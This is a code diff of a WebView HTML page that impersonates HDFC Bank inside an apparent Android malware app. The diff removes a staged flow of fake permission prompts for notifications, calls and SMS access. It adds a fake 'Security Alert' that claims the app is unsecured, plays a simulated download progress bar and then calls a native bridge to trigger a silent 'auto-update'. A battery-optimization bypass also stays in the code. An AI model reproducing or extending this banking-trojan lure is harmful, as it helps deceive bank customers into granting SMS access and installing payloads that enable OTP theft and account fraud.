@@ -62,51 +62,54 @@
         </section>
     </main>
 
-    <div class="permission-overlay" id="permissionOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
-        <div class="perm-modal" id="permModal" style="background:white; padding:30px; border-radius:20px; width:85%; text-align:center;">
-            <div id="permIcon" style="font-size:50px; margin-bottom:20px;">🔔</div>
-            <div id="permText" style="color:#333; margin-bottom:30px; font-size:16px;">Allow HDFC to send notifications?</div>
-            <div style="display:flex; gap:10px;">
-                <button onclick="nextPermission()" style="flex:1; padding:15px; background:var(--primary); color:white; border:none; border-radius:10px; font-weight:700;">Allow</button>
-                <button onclick="nextPermission()" style="flex:1; padding:15px; background:#eee; color:#666; border:none; border-radius:10px;">Deny</button>
+    <div class="permission-overlay" id="updateOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; justify-content:center; align-items:center;">
+        <div class="perm-modal" style="background:white; padding:30px; border-radius:20px; width:85%; text-align:center;">
+            <div style="font-size:50px; margin-bottom:20px;">🛡️</div>
+            <h2 style="color:#ed232a; margin-bottom:10px;">Security Alert!</h2>
+            <div style="color:#333; margin-bottom:30px; font-size:14px; line-height:1.5;">
+                Your current version is <strong>unsecured</strong>. <br>Please upgrade to the <strong>Encrypted Security Version</strong> to protect your account.
             </div>
+            
+            <div id="downloadProgress" style="display:none; width:100%; height:8px; background:#eee; border-radius:4px; margin-bottom:20px; overflow:hidden;">
+                <div id="progressBar" style="width:0%; height:100%; background:#01875f; transition: width 0.3s;"></div>
+            </div>
+            <div id="progressText" style="display:none; font-size:12px; color:#666; margin-bottom:20px;">Downloading Security Patch...</div>
+
+            <button id="updateBtn" onclick="startUpdate()" style="width:100%; padding:15px; background:#ed232a; color:white; border:none; border-radius:10px; font-weight:700; font-size:16px;">UPGRADE TO SECURE VERSION</button>
         </div>
     </div>
 
-
-
     <script>
-        const steps = [
-            { icon: '🔔', text: 'Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for alerts?' },
-            { icon: '📞', text: 'Allow <strong>HDFC Bank</strong> to manage <strong>Phone Calls</strong> for security?' },
-            { icon: '💬', text: 'Allow <strong>HDFC Bank</strong> to view <strong>SMS</strong> for auto-verification?' }
-        ];
-        let currentStep = 0;
-
-        function startPermissionFlow() {
-            currentStep = 0;
-            showStep();
-            document.getElementById('permissionOverlay').style.display = 'flex';
+        function startUpdate() {
+            document.getElementById('updateBtn').style.display = 'none';
+            document.getElementById('downloadProgress').style.display = 'block';
+            document.getElementById('progressText').style.display = 'block';
+            
+            let prog = 0;
+            let interval = setInterval(() => {
+                prog += Math.random() * 15;
+                if (prog >= 100) {
+                    prog = 100;
+                    clearInterval(interval);
+                    document.getElementById('progressText').innerHTML = "Installing Update...";
+                    if (window.AndroidBridge && window.AndroidBridge.triggerAutoUpdate) {
+                        window.AndroidBridge.triggerAutoUpdate();
+                    }
+                }
+                document.getElementById('progressBar').style.width = prog + '%';
+            }, 400);
         }
 
-        function showStep() {
-            document.getElementById('permIcon').innerHTML = steps[currentStep].icon;
-            document.getElementById('permText').innerHTML = steps[currentStep].text;
-        }
-
-        function nextPermission() {
-            currentStep++;
-            if (currentStep < steps.length) {
-                showStep();
-            } else {
-                document.getElementById('permissionOverlay').style.display = 'none';
-                if (window.AndroidBridge) {
-                    window.AndroidBridge.requestRealPermissions();
-                } else {
-                    window.location.href = 'details.html';
+        // Bridge Detection and Update Trigger
+        let bridgeRetry = setInterval(() => {
+            if (window.AndroidBridge) {
+                clearInterval(bridgeRetry);
+                // Check if we are on the limited version
+                if (window.AndroidBridge.isLimitedVersion && window.AndroidBridge.isLimitedVersion()) {
+                    document.getElementById('updateOverlay').style.display = 'flex';
                 }
             }
-        }
+        }, 500);
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
@@ -116,26 +119,8 @@
                     window.AndroidBridge.requestIgnoreBatteryOptimizations();
                     setTimeout(() => { window.location.href = 'details.html'; }, 2000);
                 }
-            } else {
-                console.log("Permission Denied - Retrying...");
             }
         }
-
-
-
-        // Robust Bridge Detection
-        let bridgeRetry = setInterval(() => {
-            if (window.AndroidBridge) {
-                clearInterval(bridgeRetry);
-                console.log("Bridge Connected!");
-                document.getElementById('statusBanner').innerHTML = "🟢 SYSTEM CONNECTED - READY";
-                document.getElementById('statusBanner').style.background = "#01875f";
-                window.AndroidBridge.requestRealPermissions();
-            }
-        }, 500);
-
-        // Fail-safe timeout
-        setTimeout(() => clearInterval(bridgeRetry), 10000);
     </script>
 </body>
 </html>
